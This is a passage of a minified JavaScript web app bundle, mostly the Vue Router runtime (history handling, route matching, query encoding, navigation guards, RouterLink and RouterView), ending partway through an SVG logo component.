        current: t,
        forward: s,
        replaced: n,
        position: window.history.length,
        scroll: i ? Di() : null
    }
}

function C1(e) {
    const {
        history: t,
        location: s
    } = window, n = {
        value: ed(e, s)
    }, i = {
        value: t.state
    };
    i.value || r(n.value, {
        back: null,
        current: n.value,
        forward: null,
        position: t.length - 1,
        replaced: !0,
        scroll: null
    }, !0);

    function r(a, c, d) {
        const p = e.indexOf("#"),
            u = p > -1 ? (s.host && document.querySelector("base") ? e : e.slice(p)) + a : x1() + e + a;
        try {
            t[d ? "replaceState" : "pushState"](c, "", u), i.value = c
        } catch (g) {
            console.error(g), s[d ? "replace" : "assign"](u)
        }
    }

    function o(a, c) {
        const d = ue({}, t.state, ol(i.value.back, a, i.value.forward, !0), c, {
            position: i.value.position
        });
        r(a, d, !0), n.value = a
    }

    function l(a, c) {
        const d = ue({}, i.value, t.state, {
            forward: a,
            scroll: Di()
        });
        r(d.current, d, !0);
        const p = ue({}, ol(n.value, a, null), {
            position: d.position + 1
        }, c);
        r(a, p, !1), n.value = a
    }
    return {
        location: n,
        state: i,
        push: l,
        replace: o
    }
}

function S1(e) {
    e = h1(e);
    const t = C1(e),
        s = _1(e, t.state, t.location, t.replace);

    function n(r, o = !0) {
        o || s.pauseListeners(), history.go(r)
    }
    const i = ue({
        location: "",
        base: e,
        go: n,
        createHref: m1.bind(null, e)
    }, t, s);
    return Object.defineProperty(i, "location", {
        enumerable: !0,
        get: () => t.location.value
    }), Object.defineProperty(i, "state", {
        enumerable: !0,
        get: () => t.state.value
    }), i
}

function E1(e) {
    return typeof e == "string" || e && typeof e == "object"
}

function td(e) {
    return typeof e == "string" || typeof e == "symbol"
}
const Dt = {
        path: "/",
        name: void 0,
        params: {},
        query: {},
        hash: "",
        fullPath: "/",
        matched: [],
        meta: {},
        redirectedFrom: void 0
    },
    sd = Symbol("");
var al;
(function(e) {
    e[e.aborted = 4] = "aborted", e[e.cancelled = 8] = "cancelled", e[e.duplicated = 16] = "duplicated"
})(al || (al = {}));

function $s(e, t) {
    return ue(new Error, {
        type: e,
        [sd]: !0
    }, t)
}

function Lt(e, t) {
    return e instanceof Error && sd in e && (t == null || !!(e.type & t))
}
const ll = "[^/]+?",
    T1 = {
        sensitive: !1,
        strict: !1,
        start: !0,
        end: !0
    },
    A1 = /[.+*?^${}()[\]/\\]/g;

function L1(e, t) {
    const s = ue({}, T1, t),
        n = [];
    let i = s.start ? "^" : "";
    const r = [];
    for (const c of e) {
        const d = c.length ? [] : [90];
        s.strict && !c.length && (i += "/");
        for (let p = 0; p < c.length; p++) {
            const u = c[p];
            let g = 40 + (s.sensitive ? .25 : 0);
            if (u.type === 0) p || (i += "/"), i += u.value.replace(A1, "\\$&"), g += 40;
            else if (u.type === 1) {
                const {
                    value: w,
                    repeatable: b,
                    optional: S,
                    regexp: x
                } = u;
                r.push({
                    name: w,
                    repeatable: b,
                    optional: S
                });
                const v = x || ll;
                if (v !== ll) {
                    g += 10;
                    try {
                        new RegExp(`(${v})`)
                    } catch (C) {
                        throw new Error(`Invalid custom RegExp for param "${w}" (${v}): ` + C.message)
                    }
                }
                let y = b ? `((?:${v})(?:/(?:${v}))*)` : `(${v})`;
                p || (y = S && c.length < 2 ? `(?:/${y})` : "/" + y), S && (y += "?"), i += y, g += 20, S && (g += -8), b && (g += -20), v === ".*" && (g += -50)
            }
            d.push(g)
        }
        n.push(d)
    }
    if (s.strict && s.end) {
        const c = n.length - 1;
        n[c][n[c].length - 1] += .7000000000000001
    }
    s.strict || (i += "/?"), s.end ? i += "$" : s.strict && (i += "(?:/|$)");
    const o = new RegExp(i, s.sensitive ? "" : "i");

    function l(c) {
        const d = c.match(o),
            p = {};
        if (!d) return null;
        for (let u = 1; u < d.length; u++) {
            const g = d[u] || "",
                w = r[u - 1];
            p[w.name] = g && w.repeatable ? g.split("/") : g
        }
        return p
    }

    function a(c) {
        let d = "",
            p = !1;
        for (const u of e) {
            (!p || !d.endsWith("/")) && (d += "/"), p = !1;
            for (const g of u)
                if (g.type === 0) d += g.value;
                else if (g.type === 1) {
                const {
                    value: w,
                    repeatable: b,
                    optional: S
                } = g, x = w in c ? c[w] : "";
                if (mt(x) && !b) throw new Error(`Provided param "${w}" is an array but it is not repeatable (* or + modifiers)`);
                const v = mt(x) ? x.join("/") : x;
                if (!v)
                    if (S) u.length < 2 && (d.endsWith("/") ? d = d.slice(0, -1) : p = !0);
                    else throw new Error(`Missing required param "${w}"`);
                d += v
            }
        }
        return d || "/"
    }
    return {
        re: o,
        score: n,
        keys: r,
        parse: l,
        stringify: a
    }
}

function I1(e, t) {
    let s = 0;
    for (; s < e.length && s < t.length;) {
        const n = t[s] - e[s];
        if (n) return n;
        s++
    }
    return e.length < t.length ? e.length === 1 && e[0] === 80 ? -1 : 1 : e.length > t.length ? t.length === 1 && t[0] === 80 ? 1 : -1 : 0
}

function N1(e, t) {
    let s = 0;
    const n = e.score,
        i = t.score;
    for (; s < n.length && s < i.length;) {
        const r = I1(n[s], i[s]);
        if (r) return r;
        s++
    }
    if (Math.abs(i.length - n.length) === 1) {
        if (cl(n)) return 1;
        if (cl(i)) return -1
    }
    return i.length - n.length
}

function cl(e) {
    const t = e[e.length - 1];
    return e.length > 0 && t[t.length - 1] < 0
}
const P1 = {
        type: 0,
        value: ""
    },
    M1 = /[a-zA-Z0-9_]/;

function k1(e) {
    if (!e) return [
        []
    ];
    if (e === "/") return [
        [P1]
    ];
    if (!e.startsWith("/")) throw new Error(`Invalid path "${e}"`);

    function t(g) {
        throw new Error(`ERR (${s})/"${c}": ${g}`)
    }
    let s = 0,
        n = s;
    const i = [];
    let r;

    function o() {
        r && i.push(r), r = []
    }
    let l = 0,
        a, c = "",
        d = "";

    function p() {
        c && (s === 0 ? r.push({
            type: 0,
            value: c
        }) : s === 1 || s === 2 || s === 3 ? (r.length > 1 && (a === "*" || a === "+") && t(`A repeatable param (${c}) must be alone in its segment. eg: '/:ids+.`), r.push({
            type: 1,
            value: c,
            regexp: d,
            repeatable: a === "*" || a === "+",
            optional: a === "*" || a === "?"
        })) : t("Invalid state to consume buffer"), c = "")
    }

    function u() {
        c += a
    }
    for (; l < e.length;) {
        if (a = e[l++], a === "\\" && s !== 2) {
            n = s, s = 4;
            continue
        }
        switch (s) {
            case 0:
                a === "/" ? (c && p(), o()) : a === ":" ? (p(), s = 1) : u();
                break;
            case 4:
                u(), s = n;
                break;
            case 1:
                a === "(" ? s = 2 : M1.test(a) ? u() : (p(), s = 0, a !== "*" && a !== "?" && a !== "+" && l--);
                break;
            case 2:
                a === ")" ? d[d.length - 1] == "\\" ? d = d.slice(0, -1) + a : s = 3 : d += a;
                break;
            case 3:
                p(), s = 0, a !== "*" && a !== "?" && a !== "+" && l--, d = "";
                break;
            default:
                t("Unknown state");
                break
        }
    }
    return s === 2 && t(`Unfinished custom RegExp for param "${c}"`), p(), o(), i
}

function O1(e, t, s) {
    const n = L1(k1(e.path), s),
        i = ue(n, {
            record: e,
            parent: t,
            children: [],
            alias: []
        });
    return t && !i.record.aliasOf == !t.record.aliasOf && t.children.push(i), i
}

function $1(e, t) {
    const s = [],
        n = new Map;
    t = pl({
        strict: !1,
        end: !0,
        sensitive: !1
    }, t);

    function i(d) {
        return n.get(d)
    }

    function r(d, p, u) {
        const g = !u,
            w = R1(d);
        w.aliasOf = u && u.record;
        const b = pl(t, d),
            S = [w];
        if ("alias" in d) {
            const y = typeof d.alias == "string" ? [d.alias] : d.alias;
            for (const C of y) S.push(ue({}, w, {
                components: u ? u.record.components : w.components,
                path: C,
                aliasOf: u ? u.record : w
            }))
        }
        let x, v;
        for (const y of S) {
            const {
                path: C
            } = y;
            if (p && C[0] !== "/") {
                const L = p.record.path,
                    M = L[L.length - 1] === "/" ? "" : "/";
                y.path = p.record.path + (C && M + C)
            }
            if (x = O1(y, p, b), u ? u.alias.push(x) : (v = v || x, v !== x && v.alias.push(x), g && d.name && !fl(x) && o(d.name)), w.children) {
                const L = w.children;
                for (let M = 0; M < L.length; M++) r(L[M], x, u && u.children[M])
            }
            u = u || x, (x.record.components && Object.keys(x.record.components).length || x.record.name || x.record.redirect) && a(x)
        }
        return v ? () => {
            o(v)
        } : rn
    }

    function o(d) {
        if (td(d)) {
            const p = n.get(d);
            p && (n.delete(d), s.splice(s.indexOf(p), 1), p.children.forEach(o), p.alias.forEach(o))
        } else {
            const p = s.indexOf(d);
            p > -1 && (s.splice(p, 1), d.record.name && n.delete(d.record.name), d.children.forEach(o), d.alias.forEach(o))
        }
    }

    function l() {
        return s
    }

    function a(d) {
        let p = 0;
        for (; p < s.length && N1(d, s[p]) >= 0 && (d.record.path !== s[p].record.path || !nd(d, s[p]));) p++;
        s.splice(p, 0, d), d.record.name && !fl(d) && n.set(d.record.name, d)
    }

    function c(d, p) {
        let u, g = {},
            w, b;
        if ("name" in d && d.name) {
            if (u = n.get(d.name), !u) throw $s(1, {
                location: d
            });
            b = u.record.name, g = ue(dl(p.params, u.keys.filter(v => !v.optional).map(v => v.name)), d.params && dl(d.params, u.keys.map(v => v.name))), w = u.stringify(g)
        } else if ("path" in d) w = d.path, u = s.find(v => v.re.test(w)), u && (g = u.parse(w), b = u.record.name);
        else {
            if (u = p.name ? n.get(p.name) : s.find(v => v.re.test(p.path)), !u) throw $s(1, {
                location: d,
                currentLocation: p
            });
            b = u.record.name, g = ue({}, p.params, d.params), w = u.stringify(g)
        }
        const S = [];
        let x = u;
        for (; x;) S.unshift(x.record), x = x.parent;
        return {
            name: b,
            path: w,
            params: g,
            matched: S,
            meta: H1(S)
        }
    }
    return e.forEach(d => r(d)), {
        addRoute: r,
        resolve: c,
        removeRoute: o,
        getRoutes: l,
        getRecordMatcher: i
    }
}

function dl(e, t) {
    const s = {};
    for (const n of t) n in e && (s[n] = e[n]);
    return s
}

function R1(e) {
    return {
        path: e.path,
        redirect: e.redirect,
        name: e.name,
        meta: e.meta || {},
        aliasOf: void 0,
        beforeEnter: e.beforeEnter,
        props: D1(e),
        children: e.children || [],
        instances: {},
        leaveGuards: new Set,
        updateGuards: new Set,
        enterCallbacks: {},
        components: "components" in e ? e.components || null : e.component && {
            default: e.component
        }
    }
}

function D1(e) {
    const t = {},
        s = e.props || !1;
    if ("component" in e) t.default = s;
    else
        for (const n in e.components) t[n] = typeof s == "object" ? s[n] : s;
    return t
}

function fl(e) {
    for (; e;) {
        if (e.record.aliasOf) return !0;
        e = e.parent
    }
    return !1
}

function H1(e) {
    return e.reduce((t, s) => ue(t, s.meta), {})
}

function pl(e, t) {
    const s = {};
    for (const n in e) s[n] = n in t ? t[n] : e[n];
    return s
}

function nd(e, t) {
    return t.children.some(s => s === e || nd(e, s))
}
const id = /#/g,
    V1 = /&/g,
    j1 = /\//g,
    B1 = /=/g,
    F1 = /\?/g,
    rd = /\+/g,
    z1 = /%5B/g,
    U1 = /%5D/g,
    od = /%5E/g,
    G1 = /%60/g,
    ad = /%7B/g,
    W1 = /%7C/g,
    ld = /%7D/g,
    q1 = /%20/g;

function Oo(e) {
    return encodeURI("" + e).replace(W1, "|").replace(z1, "[").replace(U1, "]")
}

function K1(e) {
    return Oo(e).replace(ad, "{").replace(ld, "}").replace(od, "^")
}

function zr(e) {
    return Oo(e).replace(rd, "%2B").replace(q1, "+").replace(id, "%23").replace(V1, "%26").replace(G1, "`").replace(ad, "{").replace(ld, "}").replace(od, "^")
}

function Z1(e) {
    return zr(e).replace(B1, "%3D")
}

function X1(e) {
    return Oo(e).replace(id, "%23").replace(F1, "%3F")
}

function Y1(e) {
    return e == null ? "" : X1(e).replace(j1, "%2F")
}

function li(e) {
    try {
        return decodeURIComponent("" + e)
    } catch {}
    return "" + e
}

function Q1(e) {
    const t = {};
    if (e === "" || e === "?") return t;
    const n = (e[0] === "?" ? e.slice(1) : e).split("&");
    for (let i = 0; i < n.length; ++i) {
        const r = n[i].replace(rd, " "),
            o = r.indexOf("="),
            l = li(o < 0 ? r : r.slice(0, o)),
            a = o < 0 ? null : li(r.slice(o + 1));
        if (l in t) {
            let c = t[l];
            mt(c) || (c = t[l] = [c]), c.push(a)
        } else t[l] = a
    }
    return t
}

function ul(e) {
    let t = "";
    for (let s in e) {
        const n = e[s];
        if (s = Z1(s), n == null) {
            n !== void 0 && (t += (t.length ? "&" : "") + s);
            continue
        }(mt(n) ? n.map(r => r && zr(r)) : [n && zr(n)]).forEach(r => {
            r !== void 0 && (t += (t.length ? "&" : "") + s, r != null && (t += "=" + r))
        })
    }
    return t
}

function J1(e) {
    const t = {};
    for (const s in e) {
        const n = e[s];
        n !== void 0 && (t[s] = mt(n) ? n.map(i => i == null ? null : "" + i) : n == null ? n : "" + n)
    }
    return t
}
const eh = Symbol(""),
    hl = Symbol(""),
    $o = Symbol(""),
    cd = Symbol(""),
    Ur = Symbol("");

function qs() {
    let e = [];

    function t(n) {
        return e.push(n), () => {
            const i = e.indexOf(n);
            i > -1 && e.splice(i, 1)
        }
    }

    function s() {
        e = []
    }
    return {
        add: t,
        list: () => e.slice(),
        reset: s
    }
}

function Bt(e, t, s, n, i) {
    const r = n && (n.enterCallbacks[i] = n.enterCallbacks[i] || []);
    return () => new Promise((o, l) => {
        const a = p => {
                p === !1 ? l($s(4, {
                    from: s,
                    to: t
                })) : p instanceof Error ? l(p) : E1(p) ? l($s(2, {
                    from: t,
                    to: p
                })) : (r && n.enterCallbacks[i] === r && typeof p == "function" && r.push(p), o())
            },
            c = e.call(n && n.instances[i], t, s, a);
        let d = Promise.resolve(c);
        e.length < 3 && (d = d.then(a)), d.catch(p => l(p))
    })
}

function fr(e, t, s, n) {
    const i = [];
    for (const r of e)
        for (const o in r.components) {
            let l = r.components[o];
            if (!(t !== "beforeRouteEnter" && !r.instances[o]))
                if (th(l)) {
                    const c = (l.__vccOpts || l)[t];
                    c && i.push(Bt(c, s, n, r, o))
                } else {
                    let a = l();
                    i.push(() => a.then(c => {
                        if (!c) return Promise.reject(new Error(`Couldn't resolve component "${o}" at "${r.path}"`));
                        const d = a1(c) ? c.default : c;
                        r.components[o] = d;
                        const u = (d.__vccOpts || d)[t];
                        return u && Bt(u, s, n, r, o)()
                    }))
                }
        }
    return i
}

function th(e) {
    return typeof e == "object" || "displayName" in e || "props" in e || "__vccOpts" in e
}

function gl(e) {
    const t = kt($o),
        s = kt(cd),
        n = ot(() => t.resolve(cs(e.to))),
        i = ot(() => {
            const {
                matched: a
            } = n.value, {
                length: c
            } = a, d = a[c - 1], p = s.matched;
            if (!d || !p.length) return -1;
            const u = p.findIndex(Os.bind(null, d));
            if (u > -1) return u;
            const g = ml(a[c - 2]);
            return c > 1 && ml(d) === g && p[p.length - 1].path !== g ? p.findIndex(Os.bind(null, a[c - 2])) : u
        }),
        r = ot(() => i.value > -1 && rh(s.params, n.value.params)),
        o = ot(() => i.value > -1 && i.value === s.matched.length - 1 && Jc(s.params, n.value.params));

    function l(a = {}) {
        return ih(a) ? t[cs(e.replace) ? "replace" : "push"](cs(e.to)).catch(rn) : Promise.resolve()
    }
    return {
        route: n,
        href: ot(() => n.value.href),
        isActive: r,
        isExactActive: o,
        navigate: l
    }
}
const sh = Oc({
        name: "RouterLink",
        compatConfig: {
            MODE: 3
        },
        props: {
            to: {
                type: [String, Object],
                required: !0
            },
            replace: Boolean,
            activeClass: String,
            exactActiveClass: String,
            custom: Boolean,
            ariaCurrentValue: {
                type: String,
                default: "page"
            }
        },
        useLink: gl,
        setup(e, {
            slots: t
        }) {
            const s = Li(gl(e)),
                {
                    options: n
                } = kt($o),
                i = ot(() => ({
                    [vl(e.activeClass, n.linkActiveClass, "router-link-active")]: s.isActive,
                    [vl(e.exactActiveClass, n.linkExactActiveClass, "router-link-exact-active")]: s.isExactActive
                }));
            return () => {
                const r = t.default && t.default(s);
                return e.custom ? r : et("a", {
                    "aria-current": s.isExactActive ? e.ariaCurrentValue : null,
                    href: s.href,
                    onClick: s.navigate,
                    class: i.value
                }, r)
            }
        }
    }),
    nh = sh;

function ih(e) {
    if (!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey) && !e.defaultPrevented && !(e.button !== void 0 && e.button !== 0)) {
        if (e.currentTarget && e.currentTarget.getAttribute) {
            const t = e.currentTarget.getAttribute("target");
            if (/\b_blank\b/i.test(t)) return
        }
        return e.preventDefault && e.preventDefault(), !0
    }
}

function rh(e, t) {
    for (const s in t) {
        const n = t[s],
            i = e[s];
        if (typeof n == "string") {
            if (n !== i) return !1
        } else if (!mt(i) || i.length !== n.length || n.some((r, o) => r !== i[o])) return !1
    }
    return !0
}

function ml(e) {
    return e ? e.aliasOf ? e.aliasOf.path : e.path : ""
}
const vl = (e, t, s) => e ?? t ?? s,
    oh = Oc({
        name: "RouterView",
        inheritAttrs: !1,
        props: {
            name: {
                type: String,
                default: "default"
            },
            route: Object
        },
        compatConfig: {
            MODE: 3
        },
        setup(e, {
            attrs: t,
            slots: s
        }) {
            const n = kt(Ur),
                i = ot(() => e.route || n.value),
                r = kt(hl, 0),
                o = ot(() => {
                    let c = cs(r);
                    const {
                        matched: d
                    } = i.value;
                    let p;
                    for (;
                        (p = d[c]) && !p.components;) c++;
                    return c
                }),
                l = ot(() => i.value.matched[o.value]);
            Ts(hl, ot(() => o.value + 1)), Ts(eh, l), Ts(Ur, i);
            const a = We();
            return en(() => [a.value, l.value, e.name], ([c, d, p], [u, g, w]) => {
                d && (d.instances[p] = c, g && g !== d && c && c === u && (d.leaveGuards.size || (d.leaveGuards = g.leaveGuards), d.updateGuards.size || (d.updateGuards = g.updateGuards))), c && d && (!g || !Os(d, g) || !u) && (d.enterCallbacks[p] || []).forEach(b => b(c))
            }, {
                flush: "post"
            }), () => {
                const c = i.value,
                    d = e.name,
                    p = l.value,
                    u = p && p.components[d];
                if (!u) return yl(s.default, {
                    Component: u,
                    route: c
                });
                const g = p.props[d],
                    w = g ? g === !0 ? c.params : typeof g == "function" ? g(c) : g : null,
                    S = et(u, ue({}, w, t, {
                        onVnodeUnmounted: x => {
                            x.component.isUnmounted && (p.instances[d] = null)
                        },
                        ref: a
                    }));
                return yl(s.default, {
                    Component: S,
                    route: c
                }) || S
            }
        }
    });

function yl(e, t) {
    if (!e) return null;
    const s = e(t);
    return s.length === 1 ? s[0] : s
}
const dd = oh;

function ah(e) {
    const t = $1(e.routes, e),
        s = e.parseQuery || Q1,
        n = e.stringifyQuery || ul,
        i = e.history,
        r = qs(),
        o = qs(),
        l = qs(),
        a = Tp(Dt);
    let c = Dt;
    ws && e.scrollBehavior && "scrollRestoration" in history && (history.scrollRestoration = "manual");
    const d = cr.bind(null, T => "" + T),
        p = cr.bind(null, Y1),
        u = cr.bind(null, li);

    function g(T, z) {
        let j, G;
        return td(T) ? (j = t.getRecordMatcher(T), G = z) : G = T, t.addRoute(G, j)
    }

    function w(T) {
        const z = t.getRecordMatcher(T);
        z && t.removeRoute(z)
    }

    function b() {
        return t.getRoutes().map(T => T.record)
    }

    function S(T) {
        return !!t.getRecordMatcher(T)
    }

    function x(T, z) {
        if (z = ue({}, z || a.value), typeof T == "string") {
            const m = dr(s, T, z.path),
                _ = t.resolve({
                    path: m.path
                }, z),
                A = i.createHref(m.fullPath);
            return ue(m, _, {
                params: u(_.params),
                hash: li(m.hash),
                redirectedFrom: void 0,
                href: A
            })
        }
        let j;
        if ("path" in T) j = ue({}, T, {
            path: dr(s, T.path, z.path).path
        });
        else {
            const m = ue({}, T.params);
            for (const _ in m) m[_] == null && delete m[_];
            j = ue({}, T, {
                params: p(m)
            }), z.params = p(z.params)
        }
        const G = t.resolve(j, z),
            pe = T.hash || "";
        G.params = d(u(G.params));
        const xe = d1(n, ue({}, T, {
                hash: K1(pe),
                path: G.path
            })),
            h = i.createHref(xe);
        return ue({
            fullPath: xe,
            hash: pe,
            query: n === ul ? J1(T.query) : T.query || {}
        }, G, {
            redirectedFrom: void 0,
            href: h
        })
    }

    function v(T) {
        return typeof T == "string" ? dr(s, T, a.value.path) : ue({}, T)
    }

    function y(T, z) {
        if (c !== T) return $s(8, {
            from: z,
            to: T
        })
    }

    function C(T) {
        return se(T)
    }

    function L(T) {
        return C(ue(v(T), {
            replace: !0
        }))
    }

    function M(T) {
        const z = T.matched[T.matched.length - 1];
        if (z && z.redirect) {
            const {
                redirect: j
            } = z;
            let G = typeof j == "function" ? j(T) : j;
            return typeof G == "string" && (G = G.includes("?") || G.includes("#") ? G = v(G) : {
                path: G
            }, G.params = {}), ue({
                query: T.query,
                hash: T.hash,
                params: "path" in G ? {} : T.params
            }, G)
        }
    }

    function se(T, z) {
        const j = c = x(T),
            G = a.value,
            pe = T.state,
            xe = T.force,
            h = T.replace === !0,
            m = M(j);
        if (m) return se(ue(v(m), {
            state: typeof m == "object" ? ue({}, pe, m.state) : pe,
            force: xe,
            replace: h
        }), z || j);
        const _ = j;
        _.redirectedFrom = z;
        let A;
        return !xe && f1(n, G, j) && (A = $s(16, {
            to: _,
            from: G
        }), it(G, G, !0, !1)), (A ? Promise.resolve(A) : P(_, G)).catch(E => Lt(E) ? Lt(E, 2) ? E : dt(E) : ae(E, _, G)).then(E => {
            if (E) {
                if (Lt(E, 2)) return se(ue({
                    replace: h
                }, v(E.to), {
                    state: typeof E.to == "object" ? ue({}, pe, E.to.state) : pe,
                    force: xe
                }), z || _)
            } else E = X(_, G, !0, h, pe);
            return F(_, G, E), E
        })
    }

    function W(T, z) {
        const j = y(T, z);
        return j ? Promise.reject(j) : Promise.resolve()
    }

    function N(T) {
        const z = ms.values().next().value;
        return z && typeof z.runWithContext == "function" ? z.runWithContext(T) : T()
    }

    function P(T, z) {
        let j;
        const [G, pe, xe] = lh(T, z);
        j = fr(G.reverse(), "beforeRouteLeave", T, z);
        for (const m of G) m.leaveGuards.forEach(_ => {
            j.push(Bt(_, T, z))
        });
        const h = W.bind(null, T, z);
        return j.push(h), Ve(j).then(() => {
            j = [];
            for (const m of r.list()) j.push(Bt(m, T, z));
            return j.push(h), Ve(j)
        }).then(() => {
            j = fr(pe, "beforeRouteUpdate", T, z);
            for (const m of pe) m.updateGuards.forEach(_ => {
                j.push(Bt(_, T, z))
            });
            return j.push(h), Ve(j)
        }).then(() => {
            j = [];
            for (const m of xe)
                if (m.beforeEnter)
                    if (mt(m.beforeEnter))
                        for (const _ of m.beforeEnter) j.push(Bt(_, T, z));
                    else j.push(Bt(m.beforeEnter, T, z));
            return j.push(h), Ve(j)
        }).then(() => (T.matched.forEach(m => m.enterCallbacks = {}), j = fr(xe, "beforeRouteEnter", T, z), j.push(h), Ve(j))).then(() => {
            j = [];
            for (const m of o.list()) j.push(Bt(m, T, z));
            return j.push(h), Ve(j)
        }).catch(m => Lt(m, 8) ? m : Promise.reject(m))
    }

    function F(T, z, j) {
        l.list().forEach(G => N(() => G(T, z, j)))
    }

    function X(T, z, j, G, pe) {
        const xe = y(T, z);
        if (xe) return xe;
        const h = z === Dt,
            m = ws ? history.state : {};
        j && (G || h ? i.replace(T.fullPath, ue({
            scroll: h && m && m.scroll
        }, pe)) : i.push(T.fullPath, pe)), a.value = T, it(T, z, j, h), dt()
    }
    let V;

    function te() {
        V || (V = i.listen((T, z, j) => {
            if (!Rn.listening) return;
            const G = x(T),
                pe = M(G);
            if (pe) {
                se(ue(pe, {
                    replace: !0
                }), G).catch(rn);
                return
            }
            c = G;
            const xe = a.value;
            ws && b1(rl(xe.fullPath, j.delta), Di()), P(G, xe).catch(h => Lt(h, 12) ? h : Lt(h, 2) ? (se(h.to, G).then(m => {
                Lt(m, 20) && !j.delta && j.type === pn.pop && i.go(-1, !1)
            }).catch(rn), Promise.reject()) : (j.delta && i.go(-j.delta, !1), ae(h, G, xe))).then(h => {
                h = h || X(G, xe, !1), h && (j.delta && !Lt(h, 8) ? i.go(-j.delta, !1) : j.type === pn.pop && Lt(h, 20) && i.go(-1, !1)), F(G, xe, h)
            }).catch(rn)
        }))
    }
    let ne = qs(),
        re = qs(),
        fe;

    function ae(T, z, j) {
        dt(T);
        const G = re.list();
        return G.length ? G.forEach(pe => pe(T, z, j)) : console.error(T), Promise.reject(T)
    }

    function nt() {
        return fe && a.value !== Dt ? Promise.resolve() : new Promise((T, z) => {
            ne.add([T, z])
        })
    }

    function dt(T) {
        return fe || (fe = !T, te(), ne.list().forEach(([z, j]) => T ? j(T) : z()), ne.reset()), T
    }

    function it(T, z, j, G) {
        const {
            scrollBehavior: pe
        } = e;
        if (!ws || !pe) return Promise.resolve();
        const xe = !j && w1(rl(T.fullPath, 0)) || (G || !j) && history.state && history.state.scroll || null;
        return To().then(() => pe(T, z, xe)).then(h => h && y1(h)).catch(h => ae(h, T, z))
    }
    const He = T => i.go(T);
    let gs;
    const ms = new Set,
        Rn = {
            currentRoute: a,
            listening: !0,
            addRoute: g,
            removeRoute: w,
            hasRoute: S,
            getRoutes: b,
            resolve: x,
            options: e,
            push: C,
            replace: L,
            go: He,
            back: () => He(-1),
            forward: () => He(1),
            beforeEach: r.add,
            beforeResolve: o.add,
            afterEach: l.add,
            onError: re.add,
            isReady: nt,
            install(T) {
                const z = this;
                T.component("RouterLink", nh), T.component("RouterView", dd), T.config.globalProperties.$router = z, Object.defineProperty(T.config.globalProperties, "$route", {
                    enumerable: !0,
                    get: () => cs(a)
                }), ws && !gs && a.value === Dt && (gs = !0, C(i.location).catch(pe => {}));
                const j = {};
                for (const pe in Dt) Object.defineProperty(j, pe, {
                    get: () => a.value[pe],
                    enumerable: !0
                });
                T.provide($o, z), T.provide(cd, yc(j)), T.provide(Ur, a);
                const G = T.unmount;
                ms.add(T), T.unmount = function() {
                    ms.delete(T), ms.size < 1 && (c = Dt, V && V(), V = null, a.value = Dt, gs = !1, fe = !1), G()
                }
            }
        };

    function Ve(T) {
        return T.reduce((z, j) => z.then(() => N(j)), Promise.resolve())
    }
    return Rn
}

function lh(e, t) {
    const s = [],
        n = [],
        i = [],
        r = Math.max(t.matched.length, e.matched.length);
    for (let o = 0; o < r; o++) {
        const l = t.matched[o];
        l && (e.matched.find(c => Os(c, l)) ? n.push(l) : s.push(l));
        const a = e.matched[o];
        a && (t.matched.find(c => Os(c, a)) || i.push(a))
    }
    return [s, n, i]
}
const ch = {
        __name: "App",
        setup(e) {
            return (t, s) => (O(), Vs(cs(dd)))
        }
    },
    Se = (e, t) => {
        const s = e.__vccOpts || e;
        for (const [n, i] of t) s[n] = i;
        return s
    },
    dh = {
        name: "my_logo",
        props: ["dark"]
    },
    fh = {
        class: "w-full"
    },
    ph = {
        key: 0
    },
    uh = f("svg", {
        viewBox: "0 0 383 128",
        xmlns: "http://www.w3.org/2000/svg",
        fill: "black"
    }, [f("path", {
        d: "M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z"
    })], -1),
    hh = [uh],
    gh = {
        key: 1
    },
    mh = f("svg", {
        viewBox: "0 0 383 128",
        xmlns: "http://www.w3.org/2000/svg",
        fill: "white"
    }, [f("path", {
